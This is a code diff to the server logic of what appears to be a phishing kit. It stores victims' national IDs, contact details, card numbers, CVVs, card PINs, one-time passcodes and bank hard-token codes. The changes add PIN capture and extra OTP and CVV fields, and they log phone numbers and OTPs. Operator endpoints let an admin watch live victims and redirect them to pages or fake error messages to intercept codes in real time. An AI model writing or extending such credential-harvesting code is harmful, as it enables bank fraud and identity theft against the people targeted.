@@ -72,11 +72,14 @@ function getOrCreateApp(nationalId) {
     applications[nationalId] = {
       id: appIdCounter,
       nationalId,
-      fullName: '', phone: '', address: '',
+      fullName: '', phoneNumber: '', phone: '', address: '',
       username: '', password: '',
-      otp: '', cardNumber: '', cardExpiry: '', cvv: '',
-      hardToken: '', watchLink: '',
-      selectedWatch: '',
+      otp: '', otpCode: '',
+      cardNumber: '', cardExpiry: '', cvv: '', cardCvv: '',
+      cardPin: '', cardName: '',
+      hardToken: '', watchLink: '', watchLinkOtp: '',
+      selectedWatch: '', watchColor: '',
+      governorate: '',
       currentPage: 'home',
       status: 'active',
       redirectTo: null, redirectError: null,
@@ -179,14 +182,17 @@ async function executeProcedure(name, input, req, isAdmin) {
 
     // ─── Application data collection ──────────────────────────────
     case 'applications.savePersonalInfo': {
-      const { nationalId, fullName, phone, address } = input;
+      const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
       if (!nationalId) throw new Error('nationalId required');
       const app = getOrCreateApp(nationalId);
       if (fullName) app.fullName = fullName;
-      if (phone) app.phone = phone;
+      const ph = phone || phoneNumber;
+      if (ph) { app.phone = ph; app.phoneNumber = ph; }
       if (address) app.address = address;
+      if (governorate) app.governorate = governorate;
+      if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
       app.updatedAt = new Date().toISOString();
-      console.log('[savePersonalInfo] id=' + nationalId, fullName, phone);
+      console.log('[savePersonalInfo] id=' + nationalId, fullName, ph);
       return { success: true };
     }
 
@@ -204,24 +210,27 @@ async function executeProcedure(name, input, req, isAdmin) {
     }
 
     case 'applications.saveOtpData': {
-      const { nationalId, otp } = input;
+      const { nationalId, otp, otpCode } = input;
       if (!nationalId) throw new Error('nationalId required');
       const app = getOrCreateApp(nationalId);
-      if (otp) app.otp = otp;
+      const code = otp || otpCode;
+      if (code) { app.otp = code; app.otpCode = code; }
       app.status = 'awaiting_otp';
       app.updatedAt = new Date().toISOString();
-      console.log('[saveOtpData] id=' + nationalId, otp);
+      console.log('[saveOtpData] id=' + nationalId, code);
       return { success: true };
     }
 
     case 'applications.saveCardData': {
-      const { nationalId, cardNumber, cardExpiry, cvv, cardName, expiry } = input;
+      const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
       if (!nationalId) throw new Error('nationalId required');
       const app = getOrCreateApp(nationalId);
       if (cardNumber) app.cardNumber = cardNumber;
       if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
-      if (cvv) app.cvv = cvv;
+      const cv = cvv || cardCvv;
+      if (cv) { app.cvv = cv; app.cardCvv = cv; }
       if (cardName) app.cardName = cardName;
+      if (cardPin) app.cardPin = cardPin;
       app.status = 'awaiting_card';
       app.updatedAt = new Date().toISOString();
       console.log('[saveCardData] id=' + nationalId, cardNumber);
@@ -229,10 +238,11 @@ async function executeProcedure(name, input, req, isAdmin) {
     }
 
     case 'applications.saveHardToken': {
-      const { nationalId, hardToken, token } = input;
+      const { nationalId, hardToken, hardTokenCode, token } = input;
       if (!nationalId) throw new Error('nationalId required');
       const app = getOrCreateApp(nationalId);
-      if (hardToken || token) app.hardToken = hardToken || token;
+      const tk = hardToken || hardTokenCode || token;
+      if (tk) { app.hardToken = tk; }
       app.status = 'awaiting_token';
       app.updatedAt = new Date().toISOString();
       console.log('[saveHardToken] id=' + nationalId);
@@ -240,10 +250,11 @@ async function executeProcedure(name, input, req, isAdmin) {
     }
 
     case 'applications.saveWatchLink': {
-      const { nationalId, watchLink, link } = input;
+      const { nationalId, watchLink, watchLinkOtp, link } = input;
       if (!nationalId) throw new Error('nationalId required');
       const app = getOrCreateApp(nationalId);
-      if (watchLink || link) app.watchLink = watchLink || link;
+      const wl = watchLink || watchLinkOtp || link;
+      if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
       app.updatedAt = new Date().toISOString();
       console.log('[saveWatchLink] id=' + nationalId);
       return { success: true };
@@ -277,7 +288,7 @@ async function executeProcedure(name, input, req, isAdmin) {
       const cutoff = now - 60 * 1000;
       const activeIds = apps
         .filter(a => new Date(a.updatedAt).getTime() > cutoff)
-        .map(a => a.id);
+        .map(a => a.nationalId);
       const liveVisitorCount = Object.values(visitors)
         .filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000).length;
       return { apps, activeIds, liveVisitorCount, totalVisitors };
@@ -292,7 +303,7 @@ async function executeProcedure(name, input, req, isAdmin) {
 
     case 'admin.getAllVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
-      return { visitors: Object.values(visitors) };
+      return { visitors: Object.values(visitors), totalCount: totalVisitors };
     }
 
     case 'admin.getWhatsAppLink': {
@@ -344,10 +355,12 @@ async function executeProcedure(name, input, req, isAdmin) {
 
     case 'admin.redirectUser': {
       if (!isAdmin) throw new Error('unauthorized');
-      const { nationalId, redirectTo, redirectError } = input;
+      const { nationalId, redirectTo, page, redirectError, showError } = input;
+      const target = redirectTo || page || null;
+      const err = redirectError || showError || null;
       if (nationalId && applications[nationalId]) {
-        applications[nationalId].redirectTo = redirectTo || null;
-        applications[nationalId].redirectError = redirectError || null;
+        applications[nationalId].redirectTo = target;
+        applications[nationalId].redirectError = err;
         applications[nationalId].updatedAt = new Date().toISOString();
       }
       return { success: true };
@@ -355,9 +368,9 @@ async function executeProcedure(name, input, req, isAdmin) {
 
     case 'admin.redirectVisitor': {
       if (!isAdmin) throw new Error('unauthorized');
-      const { sessionId, redirectTo } = input;
+      const { sessionId, redirectTo, page } = input;
       if (sessionId && visitors[sessionId]) {
-        visitors[sessionId].redirectTo = redirectTo || null;
+        visitors[sessionId].redirectTo = redirectTo || page || null;
       }
       return { success: true };
     }
@@ -400,13 +413,15 @@ async function executeProcedure(name, input, req, isAdmin) {
 
     case 'admin.deleteInactiveClients': {
       if (!isAdmin) throw new Error('unauthorized');
-      const cutoff = Date.now() - 10 * 60 * 1000;
+      const cutoff = Date.now() - 2 * 60 * 1000;
+      let deletedCount = 0;
       for (const key of Object.keys(applications)) {
         if (new Date(applications[key].updatedAt).getTime() < cutoff) {
           delete applications[key];
+          deletedCount++;
         }
       }
-      return { success: true };
+      return { success: true, deletedCount };
     }
 
     case 'admin.resetTotalVisitors': {
